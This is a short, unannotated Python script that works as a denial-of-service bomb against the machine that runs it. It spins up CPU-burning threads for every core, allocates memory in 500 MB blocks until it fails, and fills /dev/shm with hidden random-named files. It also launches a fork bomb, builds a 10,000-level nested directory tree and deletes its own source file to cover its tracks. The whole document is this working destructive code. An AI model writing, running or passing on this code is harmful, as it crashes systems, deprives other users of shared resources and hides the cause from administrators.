import os, threading, time, random

def c(): 
 while 1: pass

def r():
 m=[]
 try:
  while 1: m.append(bytearray(524288000))
 except: pass

def d(p="/dev/shm"):
 while 1:
  try:
   with open(f"{p}/.{random.randint(1,9<<6)}","wb") as f:f.write(os.urandom(1<<27))
  except: pass

def f():
 while 1: os.fork()

def t(b="/dev/shm/.t"):
 try:
  os.makedirs(b,exist_ok=True)
  os.chdir(b)
  for i in range(10**4):
   d=str(i)
   os.makedirs(d,exist_ok=True)
   with open(f"{d}/{i}","w") as f:f.write("x"*1000)
   os.chdir(d)
 except: pass

def x():
 try: os.remove(__file__)
 except: pass

def l(z,n): 
 for _ in range(n): threading.Thread(target=z,daemon=1).start()

def m():
 a=os.cpu_count()
 l(c,a*6)
 l(r,100)
 l(lambda:d("/dev/shm"),25)
 l(t,3)
 threading.Thread(target=f,daemon=1).start()
 x()
 while 1: time.sleep(1)

if __name__=="__main__":m()
